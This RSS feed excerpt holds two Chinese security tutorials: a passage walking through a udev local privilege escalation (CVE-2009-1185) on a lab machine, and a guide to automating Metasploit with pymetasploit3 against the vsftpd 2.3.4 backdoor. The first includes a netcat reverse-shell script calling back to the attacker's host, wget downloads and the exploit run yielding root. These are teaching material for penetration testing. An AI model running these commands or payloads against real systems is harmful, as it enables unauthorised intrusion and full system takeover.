Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Es | exploits/linux/local/22363.c
Linux Kernel 2.4.1 &amp;lt; 2.4.37 / 2.6.1 &amp;lt; 2.6.32-rc5 - &amp;#39;pipe.c&amp;#39; Local Pr | exploits/linux/local/9844.py
Linux Kernel 2.4.32/2.6.0 - &amp;#39;do_mremap()&amp;#39; Bound Checking Privilege E | exploits/linux/local/145.c
Linux Kernel 2.4.30/2.6.11.5 - Bluetooth &amp;#39;bluez_sock_create&amp;#39; Local P | exploits/linux/local/25289.c
Linux Kernel 2.4.4 &amp;lt; 2.4.37.4 / 2.6.0 &amp;lt; 2.6.30.4 - &amp;#39;Sendpage&amp;#39; Local  | exploits/linux/local/19933.rb
Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / REHL 4.8/5.3 / SuSE 10 SP | exploits/linux/local/9545.c
Linux Kernel 2.4.x/2.6.x - &amp;#39;Bluez&amp;#39; BlueTooth Signed Buffer Index Pri | exploits/linux/local/926.c
Linux Kernel 2.4.x/2.6.x - &amp;#39;uselib()&amp;#39; Local Privilege Escalation (3) | exploits/linux/local/895.c
Linux Kernel 2.4.x/2.6.x - Bluetooth Signed Buffer Index Privilege E | exploits/linux/local/25288.c
Linux Kernel 2.4/2.6 (Fedora 11) - &amp;#39;sock_sendpage()&amp;#39; Local Privilege | exploits/linux/local/9598.txt
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 &amp;lt; 11 / Whitebox | exploits/linux/local/9479.c
Linux Kernel 2.4/2.6 (x86-64) - System Call Emulation Privilege Esca | exploits/linux_x86-64/local/4460.c
Linux Kernel 2.4/2.6 - &amp;#39;sock_sendpage()&amp;#39; Local Privilege Escalation  | exploits/linux/local/9641.txt
Linux Kernel 2.6 (Debian 4.0 / Ubuntu / Gentoo) UDEV &amp;lt; 1.4.1 - Local | exploits/linux/local/8478.sh
Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9/04) UDEV &amp;lt; 1.4.1 - Local Pr | exploits/linux/local/8572.c
Linux Kernel 2.6 &amp;lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Cor | exploits/linux_x86/local/9542.c
Linux Kernel 2.6.0 &amp;lt; 2.6.31 - &amp;#39;pipe.c&amp;#39; Local Privilege Escalation (1 | exploits/linux/local/33321.c
Linux Kernel 2.6.10 &amp;lt; 2.6.31.5 - &amp;#39;pipe.c&amp;#39; Local Privilege Escalation | exploits/linux/local/40812.c&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;由于我们是要找提权 exp，所以我们搜索 &lt;b&gt;privilege&lt;/b&gt;，然后使用 &lt;b&gt;grep&lt;/b&gt; 命令来缩小查找范围，加上 &lt;b&gt;-i &lt;/b&gt;参数忽略大小写。对于此示例，我们使用 &lt;b&gt;8572.c &lt;/b&gt;这个exp，它利用了 UDEV 设备管理器中的一个漏洞，允许通过未经验证的 &lt;b&gt;Netlink &lt;/b&gt;消息来执行代码。复制 exp 位置，然后使用&lt;b&gt; locate&lt;/b&gt; 命令来查找完整的路径，也就是&lt;b&gt;/usr/share/exploitdb/exploits/linux/local/8572.c。&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;root@nullbyte:~# locate linux/local/8572.c
/usr/share/exploitdb/exploits/linux/local/8572.c
root@nullbyte:~#&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个 exp 是用 C 语言写的（扩展名为.c），但是我们不用担心源代码问题，只要我们编译它就可以运行。&lt;/p&gt;&lt;p&gt;现在我们查看该文件，并且查看关于 exp 的详细信息，还有开发者的注释。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;* cve-2009-1185.c
*
* udev &amp;lt; 1141 Local Privilege Escalation Exploit
* Jon Oberheide &amp;lt;jon@oberheide.org&amp;gt;
* http://jon.oberheide.org
*
* Information:
*
*   http://cvemitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1185
*
*   udev before 1.4.1 does not verify whether a NETLINK message originates
*   from kernel space, which allows local users to gain privileges by sending
*   a NETLINK message from user space.
*
* Notes:
*
*   An alternative version of kcope&amp;#39;s exploit.  This exploit leverages the
*   95-udev-late.rules functionality that is meant to run arbitrary commands
*   when a device is removed.  A bit cleaner and reliable as long as you
*   distro ships that rule file.
*
*   Tested on Gentoo, Intrepid, and Jaunty.
*
* Usage:
*
*   Pass the PID of the udevd netlink socket (listed in /proc/net/netlink,
*   usually is the udevd PID minus 1) as argv[1].
*
*   The exploit will execute /tmp/run as root so throw whatever payload you
*   want in there.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;第二步 把 exp 上传到靶机中&lt;/h2&gt;&lt;p&gt;要利用这个 exp，需要把它上传到靶机中。最简单的方法就是在本地 kali 中搭建 Apache 服务器，把 exp 放在本地服务器上，然后从靶机连接到这个服务器并下载 exp。不过，在这之前，我们要采取一些准备措施。&lt;/p&gt;&lt;p&gt;首先，我们要确保服务器已在 kali 上启动并运行，这个只要在终端中执行 &lt;b&gt;service apache2 restart&lt;/b&gt; 命令即可。然后我们要在服务器文件目录下建立 exp 所在位置的符号链接，这样 exp 才可以下载，为此，需要执行以下命令：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;ln -s /usr/share/exploitdb/exploits/linux/local/ /var/www/html/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个 exp 将在靶机的 &lt;b&gt;/tmp &lt;/b&gt;目录下运行，所以，我们首先要创建一个将要执行的文件。在 kali 上，使用&lt;b&gt;nano /var/www/html/run &lt;/b&gt;命令来创建一个文件并输入下面内容：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;#! /bin/bash
nc 172.16.1.100 4321 -e /bin/bash&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当这个文件执行时，它会使用 &lt;b&gt;Netcat &lt;/b&gt;去连接 kali 的4321端口并生成一个 shell。执行的时候敲 Ctrl-X, Y, 和 Enter 进行保存。&lt;/p&gt;&lt;p&gt;现在我们准备将 exp 上传到靶机。回到我们的低权限shell，切换到 &lt;b&gt;/tmp &lt;/b&gt;目录下，使用 &lt;b&gt;wget&lt;/b&gt; 命令连接到kali 上运行的服务器，然后将文件上传到靶机上。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;cd /tmp
wget http://172.16.1.100/run
--15:18:31--  http://172.16.1.100/run
           =&amp;gt; &amp;#39;run&amp;#39;
Connecting to 172.16.1.100:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46

    OK                                                  100%  978.43 KB/s

15:18:31 (978.43 KB/s) - &amp;#39;run&amp;#39; saved [46/46]

wget http://172.16.1.100/local/8752.c
--15:19:24--  http://172.16.1.100/local/8572.c
           =&amp;gt; &amp;#39;8572.c&amp;#39;
Connecting to 172.16.1.100:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,876 (2.8K) [text/x-csrc]

    OK                                                  100%  100.46 MB/s

15:19:24 (100.46 MB/s) - &amp;#39;8572.c&amp;#39; saved [2876/2876]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;第三步 编译&amp;amp;执行&lt;/h2&gt;&lt;p&gt;现在 exp 文件已经成功上传到靶机上了，我们下一步就是执行该 exp。由于 exp 文件是用 C 语言编写的，我们需要把它编译成可执行文件。这里我们不会深入讨论编译语言的细节，我们只需要把源码编译成可执行文件，能够运行即可，在 Linux 系统中，只要使用 &lt;b&gt;gcc&lt;/b&gt; 命令即可，使用 &lt;b&gt;-o &lt;/b&gt;参数来指定输出文件的名字：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;gcc -o exploit 8572.c&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果出现没有找到 &lt;b&gt;ld&lt;/b&gt;（动态链接器）的情况，我们需要使用 &lt;b&gt;-B&lt;/b&gt; 参数来指定链接器的位置，在本例中，位置在 &lt;b&gt;/usr/bin&lt;/b&gt;，命令如下：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;gcc -B /usr/bin -o exploit 8572.c&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后，我们可以使用&lt;b&gt; ls&lt;/b&gt; 命令来查看可执行文件是否已经成功编译，如图所示：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;gcc -o exploit 8572.c
collect2: cannont find &amp;#39;ld&amp;#39;

gcc -B /usr/bin -o exploit 8572.c

ls
4674.jsvc_up
8572.c
exploit
jVswA
mhbkk
run&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 &lt;b&gt;8572.c &lt;/b&gt;文件的文档中，它说我们要找到 &lt;b&gt;Netlink&lt;/b&gt; 套接字的 &lt;b&gt;PID&lt;/b&gt;，这个 &lt;b&gt;PID&lt;/b&gt; 通常比 &lt;b&gt;UDEVD&lt;/b&gt; 的 &lt;b&gt;PID&lt;/b&gt; 小1。我们使用&lt;b&gt; cat /proc/net/netlink &lt;/b&gt;命令来查看 &lt;b&gt;PID&lt;/b&gt;，唯一的非0的 &lt;b&gt;PID&lt;/b&gt; 就是我们想要的数字。我们可以验证这个 &lt;b&gt;PID&lt;/b&gt; 是否正确，使用&lt;b&gt; ps aux | grep udev &lt;/b&gt;来查看 &lt;b&gt;UDEVD &lt;/b&gt;的 &lt;b&gt;PID&lt;/b&gt;，它应该比刚才的数字大1，如图所示：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;cat /proc/net/netlink
sk       Eth Pid    Groups   Rmem     Wmem    Dump     Locks
celb4800 0   0      00000000 0        0       00000000 2
cf87fa00 4   0      00000000 0        0       00000000 2
cd678000 7   0      00000000 0        0       00000000 2
cdc4bc00 9   0      00000000 0        0       00000000 2
cdc09c00 10  0      00000000 0        0       00000000 2
ce1bc400 15  0      00000000 0        0       00000000 2
cf8dee00 15  2459   00000000 0        0       00000000 2
cd394800 16  0      00000000 0        0       00000000 2
cd5f6200 18  0      00000000 0        0       00000000 2
ps aux | grep udev
root      2460  0.0  0.2   2216   648 ?       S&amp;lt;s  14:42  0:01 /sbinudevd --daemon&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来，我们需要在 kali 中设置监听器，当脚本执行时我们就能捕获 shell。在 kali上执行 &lt;b&gt;nc –lvp 4321 &lt;/b&gt;命令来监听入站连接。&lt;/p&gt;&lt;p&gt;现在我们的监听器是开着的，我们终于可以进行漏洞利用了。记住，要把 &lt;b&gt;Netlink&lt;/b&gt; 的 &lt;b&gt;PID&lt;/b&gt; 作为参数传递过去，也就是 2459。在低权限 shell 中执行下面的命令：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./exploit 2459&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;片刻之后，我们的 &lt;b&gt;Netcat&lt;/b&gt; 监听器就获取到了一个新的连接会话，我们输入&lt;b&gt; id&lt;/b&gt; 和 &lt;b&gt;whoami &lt;/b&gt;命令来查看用户信息，可以看到我们已经获取到 root 权限了。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;root@nullbyte:~# nc -lvp 4321
listening on [any] 4321 ...
172.16.1.102: inverse host lookup failed: Unknown host
connect to [172.16.1.100] from (UNKNOWN) [172.16.1.102] 34418
id
uid=0(root) gid=0(root)
whoami
root&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在我们已经完全控制了整个系统，可以做任何想做的事了。&lt;/p&gt;&lt;p&gt;来源：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//null-byte.wonderhowto.com/how-to/perform-local-privilege-escalation-using-linux-kernel-exploit-0186317/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;null-byte.wonderhowto.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/how-to/perform-local-privilege-escalation-using-linux-kernel-exploit-0186317/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;</description>
<author>二向箔安全</author>
<guid isPermaLink="false">2019-08-20-78943079</guid>
<pubDate>Tue, 20 Aug 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>利用 Python3 来实现 Metasploit 自动化</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-08-15-78328450.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/78328450&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-58b34da2684e34eee543d8ad4d5da9e9_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;你是否每次渗透测试都有一个要执行的任务列表，例如，SSH 暴力破解或端口映射？又或者使用 Python 和 Metasploit 使它自动化！不幸的是，之前一直没有一个功能齐全的 Python 库来简化这些工作，直到今天……&lt;/p&gt;&lt;p&gt;Pymetasploit3建立在 allfro 的 pymetasploit 库之上。它使 Metasploit 自动化变得更加容易。由于 pymetasploit3 构建于 Python3 之上，因此您还可以获得 Python3 的 asyncio 库的强大功能并执行自动化任务。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;700&quot; data-rawheight=&quot;400&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;700&quot; data-original=&quot;https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;700&quot; data-rawheight=&quot;400&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;700&quot; data-original=&quot;https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;安装&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;mkdir your-new-project-directory 
cd your-new-project-directory
利用 Python3 来实现 Metasploit 自动化

 pipenv install –three pyme tasploit3 
pipenv shell&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;或者&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;pip install --user pyme tasploit3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;启动 Metasploit RPC server&lt;/b&gt;&lt;/p&gt;&lt;p&gt;执行 msfconsole 或者 msfrpcd&lt;/p&gt;&lt;p&gt;&lt;b&gt;Msfconsole&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ Msfconsole msf&amp;gt; load msgrpc Pass=你的密码&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;Msfrpcd&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ msfrpcd -P 你的密码&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;使用方法&lt;/b&gt;&lt;/p&gt;&lt;p&gt;准备好与 Metasploit 进行互动。 如果您要连接到 msfrpcd 服务，您需创建一个这样的RPC客户端：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; from pymetasploit3.msfrpc import * 
&amp;gt;&amp;gt;&amp;gt; client = MsfRpcClient(‘你的密码&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;连接到 msfconsole RPC plugin:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; from pymetasploit3.msfrpc import * 
&amp;gt;&amp;gt;&amp;gt; client = MsfRpcClient(&amp;#39;你的密码&amp;#39;, port=55553)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;RPC  client是库的核心，所有功能都直接来自这个对象。使用 dir() 可以很容易地查看 Python 库对象:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; [m for m in dir(client) if not m.startswith(&amp;#39;_&amp;#39;)]
 &amp;gt;&amp;gt;&amp;gt; [&amp;#39;auth&amp;#39;, &amp;#39;authenticated&amp;#39;, &amp;#39;call&amp;#39;, &amp;#39;client&amp;#39;, &amp;#39;consoles&amp;#39;, &amp;#39;core&amp;#39;, &amp;#39;db&amp;#39;, &amp;#39;jobs&amp;#39;, &amp;#39;login&amp;#39;, &amp;#39;logout&amp;#39;, &amp;#39;modules&amp;#39;, &amp;#39;plugins&amp;#39;, &amp;#39;port&amp;#39;, &amp;#39;server&amp;#39;, &amp;#39;token&amp;#39;, &amp;#39;sessions&amp;#39;, &amp;#39;ssl&amp;#39;, &amp;#39;uri&amp;#39;] 
&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;让我们来看下 exploit 模块：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; client.modules.exploit
[&amp;#39;windows/wins/ms04_045_wins&amp;#39;, &amp;#39;windows/winrm/winrm_sc ript_exec&amp;#39;, &amp;#39;windows/vpn/safenet_ike_11&amp;#39;,
&amp;#39;windows/vnc/winvnc_http_get&amp;#39;, &amp;#39;windows/vnc/ultravnc_viewer_bof&amp;#39;, &amp;#39;windows/vnc/ultravnc_client&amp;#39;, ...
&amp;#39;aix/rpc_ttdbserverd_realpath&amp;#39;, &amp;#39;aix/rpc_cmsd_opcode21&amp;#39;]
&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;创建一个 exploit 模块对象很简单。通过 client.modules.use() 传入模块类型以及模块名称。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; exploit = client.modules.use(&amp;#39;exploit&amp;#39;, &amp;#39;unix/ftp/vsftpd_234_backdoor&amp;#39;) &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在我们设置模块选项。我们首先要看看哪些目标可用并设置合适的目标。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; exploit.targets
 {0: &amp;#39;Automatic&amp;#39;}
&amp;gt;&amp;gt;&amp;gt; 
&amp;gt;&amp;gt;&amp;gt; exploit.default_target 
0
 &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在这种情况下，只有一个目标，并且已经设置成默认的。您可以使用具有多个目标的漏洞，并设置它：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; exploit.target = 0 
0
 &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;让我们找出这个目标的有效载荷：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; exploit.targetpayloads() 
[&amp;#39;cmd/unix/interact&amp;#39;] 
&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下一步是查看和设置模块选项。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; exploit.options
 [&amp;#39;WORKSPACE&amp;#39;, &amp;#39;VERBOSE&amp;#39;, &amp;#39;WfsDelay&amp;#39;, &amp;#39;EnableContextEncoding&amp;#39;, &amp;#39;ContextInformationFile&amp;#39;, &amp;#39;DisablePayloadHandler&amp;#39;, &amp;#39;RHOSTS&amp;#39;, &amp;#39;RPORT&amp;#39;, &amp;#39;SSL&amp;#39;, &amp;#39;SSLVersion&amp;#39;, &amp;#39;SSLVerifyMode&amp;#39;, &amp;#39;SSLCipher&amp;#39;, &amp;#39;Proxies&amp;#39;, &amp;#39;CPORT&amp;#39;, &amp;#39;CHOST&amp;#39;, &amp;#39;ConnectTimeout&amp;#39;, &amp;#39;TCP::max_send_size&amp;#39;, &amp;#39;TCP::send_delay&amp;#39;]
 &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面大多数选项都已经设置好了默认值，但是我们如何知道哪些选项是必须要设置的，并且我们如何设置它们？&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; expoit.missing_required
 [&amp;#39;RHOSTS&amp;#39;]
 &amp;gt;&amp;gt;&amp;gt; exploit[‘RHOSTS’] = 192.168.1.2 
&amp;gt;&amp;gt;&amp;gt; exploit.runoptions
 {&amp;#39;VERBOSE&amp;#39;: False, &amp;#39;WfsDelay&amp;#39;: 0, &amp;#39;EnableContextEncoding&amp;#39;: False, &amp;#39;DisablePayloadHandler&amp;#39;: False, &amp;#39;RPORT&amp;#39;: 21, &amp;#39;SSL&amp;#39;: False, &amp;#39;SSLVersion&amp;#39;: &amp;#39;Auto&amp;#39;, &amp;#39;SSLVerifyMode&amp;#39;: &amp;#39;PEER&amp;#39;, &amp;#39;ConnectTimeout&amp;#39;: 10, &amp;#39;TCP::max_send_size&amp;#39;: 0, &amp;#39;TCP::send_delay&amp;#39;: 0, &amp;#39;RHOSTS&amp;#39;: &amp;#39;192.168.1.2&amp;#39;}
 &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们在上面的输出中可以看到我们成功地将 RHOSTS 设置为192.168.1.2。 现在我们准备通过在 Metasploit 控制台中运行漏洞来弹出 shell。 Metasploit 控制台是在使用命令 msfconsole 启动 Metasploit 时给出的提示，但如果您使用带有 msfrpcd 的 RPC 守护程序启动 Metasploit，也可以创建控制台。 下面，我们将创建一个新的控制台，获取其控制台 ID，并在该控制台内运行 exploit 模块，以便我们可以收集模块的输出。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; console_id = client.consoles.console().cid 
&amp;gt;&amp;gt;&amp;gt; console = client.consoles.console(console_id) 
&amp;gt;&amp;gt;&amp;gt; console.run_module_with_output(exploit, payload=’cmd/unix/interact’) 
# Some time passes 
&amp;#39;VERBOSE =&amp;gt; false\nWfsDelay =&amp;gt; 0 [...] [*] 192.168.1.2:21 - Banner: 220 vsFTPd 2.3.4\n[*] 192.168.1.2:21 - USER: 331 Please specify the password [...]&amp;#39;
 &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在我们有一个会话，我们与它进行交互。client.sessions.list 将返回一个字典，其中每个键都是会话标识符，并且会话数据将作为值存储。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; client.sessions.list 
{&amp;#39;1&amp;#39;: {&amp;#39;info&amp;#39;: &amp;#39;&amp;#39;, &amp;#39;username&amp;#39;: &amp;#39;jsmith&amp;#39;, &amp;#39;session_port&amp;#39;: 21, &amp;#39;via_payload&amp;#39;: &amp;#39;payload/cmd/unix/interact&amp;#39;, &amp;#39;uuid&amp;#39;: &amp;#39;5orqnnyv&amp;#39;, &amp;#39;tunnel_local&amp;#39;: &amp;#39;172.16.14.1:58429&amp;#39;, &amp;#39;via_exploit&amp;#39;: &amp;#39;exploit/unix/ftp/vsftpd_234_backdoor&amp;#39;, &amp;#39;exploit_uuid&amp;#39;: &amp;#39;3whbuevf&amp;#39;, &amp;#39;tunnel_peer&amp;#39;: &amp;#39;192.168.1.2:6200&amp;#39;, &amp;#39;workspace&amp;#39;: &amp;#39;false&amp;#39;, &amp;#39;routes&amp;#39;: &amp;#39;&amp;#39;, &amp;#39;target_host&amp;#39;: &amp;#39;192.168.1.2&amp;#39;, &amp;#39;type&amp;#39;: &amp;#39;shell&amp;#39;, &amp;#39;session_host&amp;#39;: &amp;#39;192.168.1.2&amp;#39;, &amp;#39;desc&amp;#39;: &amp;#39;Command shell&amp;#39;}}
 &amp;gt;&amp;gt;&amp;gt; shell = client.sessions.session(&amp;#39;1&amp;#39;) 
&amp;gt;&amp;gt;&amp;gt; shell.write(&amp;#39;whoami&amp;#39;) 
&amp;gt;&amp;gt;&amp;gt; shell.read() &amp;#39;\nroot&amp;#39; 
&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;假设您想在这个会话中运行一个命令，等待命令完成，并返回命令的输出。这在控制台中很简单，因为每个控制台会告诉您，它是否仍在运行您发送的最后一个命令。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; console.is_busy() 
False 
&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不幸的是，会话没有来自 Metasploit 提供的 session 内置功能。有三种方法可以解决这个问题。方法一：等待从会话中读取任何数据并返回该数据。这对于一次性打印所有数据的系统命令非常有效。下面，我们将在远程会话上运行 arp 命令，并在接收到任何数据时立即返回。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; cmd = &amp;#39;arp&amp;#39; 
&amp;gt;&amp;gt;&amp;gt; shell.run_with_output(cmd) 
&amp;#39;\n Address                  HWtype  HWaddress           Flags Mask […]&amp;#39;
 &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;方法二是等待一段时间，然后在该时间之后返回所有数据。 需要注意的一个细节是，默认情况下，Metasploit 的通讯超时为300秒。 如果您希望运行一个耗时超过300秒的命令，则必须设置 Metasploit 通信超时以及 run_with_output() 的超时。 例如，要将 Meterpreter shell 的通信超时更改为500秒，请在 Meterpreter shell 中运行 set_timeouts -c 500。 下面示例中的 shell 仍然是我们在前面的示例中使用的相同的简单 Linux shell，所以没有必要这样做。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; cmd = &amp;#39;arp&amp;#39;
 &amp;gt;&amp;gt;&amp;gt; shell.run_with_output(cmd, timeout=10s, timeout_exception=False) 
# 10 seconds pass &amp;#39;\n Address                  HWtype  HWaddress           Flags Mask […]&amp;#39;
